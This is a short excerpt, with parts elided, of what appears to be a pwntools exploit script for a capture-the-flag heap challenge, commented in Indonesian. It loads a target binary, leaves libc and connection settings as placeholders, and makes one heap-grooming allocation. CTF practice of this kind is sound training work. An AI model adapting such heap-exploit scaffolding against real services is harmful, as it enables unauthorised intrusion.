...
# --- Konfigurasi ---
# Ganti dengan ELF binary jika disediakan untuk mendapatkan alamat simbol secara lokal
elf = context.binary = ELF('./early', checksec=False) 
# Ganti dengan libc yang digunakan di server jika diketahui
# libc = ELF('./libc.so.6', checksec=False) 

# Ganti HOST dan PORT dengan detail koneksi dari CTF
...
# Alokasikan chunk untuk mencegah konsolidasi dengan top chunk
add_note(0, 0x420, b'A'*8) 
